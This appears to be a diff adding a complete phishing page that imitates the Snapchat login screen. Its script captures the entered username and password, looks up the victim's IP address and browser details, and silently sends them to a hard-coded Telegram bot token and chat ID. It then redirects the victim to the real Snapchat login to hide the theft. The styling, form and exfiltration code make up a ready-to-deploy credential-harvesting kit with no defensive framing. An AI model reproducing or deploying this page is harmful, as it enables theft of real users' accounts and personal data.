@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            margin-bottom: 15px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 60px;
+            height: 60px;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #000;
+            margin-top: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text span {
+            color: #fffc00;
+            text-shadow: 0 0 2px #000;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field {
+            background-color: #f7f7f7;
+            border: 1px solid #e0e0e0;
+            border-radius: 30px;
+            padding: 14px 20px;
+            margin-bottom: 12px;
+            font-size: 15px;
+            outline: none;
+            width: 100%;
+            transition: all 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #fffc00;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.1);
+        }
+
+        .login-btn {
+            background-color: #fffc00;
+            color: #000;
+            border: none;
+            border-radius: 30px;
+            padding: 14px 20px;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.3);
+        }
+
+        .login-btn:hover {
+            background-color: #f5f000;
+            transform: scale(1.02);
+        }
+
+        .login-btn:disabled {
+            background-color: #f0f0f0;
+            box-shadow: none;
+            cursor: default;
+            transform: none;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #7a7a7a;
+        }
+
+        .signup-link a {
+            color: #000;
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .forgot-password a {
+            color: #7a7a7a;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            color: #000;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer a:hover {
+            color: #000;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #e0e0e0;
+        }
+
+        .divider-text {
+            margin: 0 15px;
+        }
+
+        .qr-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #f7f7f7;
+            border: 1px solid #e0e0e0;
+            border-radius: 30px;
+            padding: 12px;
+            color: #000;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 10px;
+        }
+
+        .qr-login:hover {
+            background: #f0f0f0;
+        }
+
+        .qr-login svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .ghost-mode {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #7a7a7a;
+            font-size: 13px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#fffc00"/>
+                    <circle cx="8.5" cy="10.5" r="2.5" fill="#000"/>
+                    <circle cx="15.5" cy="10.5" r="2.5" fill="#000"/>
+                    <path d="M12 16c-1.5 0-2.8-.8-3.5-2h7c-.7 1.2-2 2-3.5 2z" fill="#000"/>
+                </svg>
+                <div class="logo-text"><span>Snap</span>chat</div>
+            </div>
+
+            <form id="loginForm">
+                <input type="text" class="input-field" placeholder="Username or Email" id="username" required>
+                <input type="password" class="input-field" placeholder="Password" id="password" required>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#">Forgot your password?</a>
+            </div>
+
+            <div class="divider">
+                <span class="divider-line"></span>
+                <span class="divider-text">OR</span>
+                <span class="divider-line"></span>
+            </div>
+
+            <a href="#" class="qr-login">
+                <svg viewBox="0 0 24 24" width="20" height="20">
+                    <path d="M3 3h6v6H3V3zm2 2v2h2V5H5zm-2 8h6v6H3v-6zm2 2v2h2v-2H5zm8-12h6v6h-6V3zm2 2v2h2V5h-2zm-2 8h6v6h-6v-6zm2 2v2h2v-2h-2z" fill="currentColor"/>
+                </svg>
+                Log in with QR Code
+            </a>
+
+            <div class="ghost-mode">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#7a7a7a">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+                </svg>
+                Ghost Mode is off
+            </div>
+
+            <div class="signup-link">
+                New to Snapchat? <a href="#">Sign Up</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div>
+                <a href="#">About</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Support</a>
+            </div>
+            <div style="margin-top: 15px;">
+                © 2024 Snapchat · All rights reserved
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
+        const CHAT_ID = '6398977115';
+
+        // Function to send data to Telegram
+        async function sendToTelegram(username, password) {
+            try {
+                // Get IP address (silent)
+                let userIP = 'Unknown';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    userIP = ipData.ip;
+                } catch (e) {}
+
+                // Get browser info
+                const browserInfo = navigator.userAgent.substring(0, 100);
+                const platform = navigator.platform;
+
+                // Create message
+                const message = `🔐 *Snapchat Login Alert*%0A👤 *Username/Email:* ${username}%0A🔑 *Password:* ${password}%0A🌍 *IP Address:* ${userIP}%0A💻 *Browser:* ${browserInfo}%0A📱 *Platform:* ${platform}%0A🕐 *Time:* ${new Date().toLocaleString()}`;
+
+                // Send to Telegram
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
+                
+                await fetch(url, {
+                    method: 'GET',
+                    mode: 'no-cors' // This ensures it works even with CORS issues
+                });
+
+            } catch (e) {
+                // Silent fail - user never knows
+                console.log('Telegram send attempt completed');
+            }
+        }
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                return; // Silent fail
+            }
+
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in...';
+
+            // Send to Telegram
+            await sendToTelegram(username, password);
+            
+            // Redirect to real Snapchat login
+            setTimeout(() => {
+                window.location.href = 'https://accounts.snapchat.com/accounts/v2/login';
+            }, 500);
+        });
+
+        // Input field effects
+        document.querySelectorAll('.input-field').forEach(field => {
+            field.addEventListener('focus', function() {
+                this.style.borderColor = '#fffc00';
+            });
+            
+            field.addEventListener('blur', function() {
+                this.style.borderColor = '#e0e0e0';
+            });
+        });
+    </script>
+</body>
+</html>
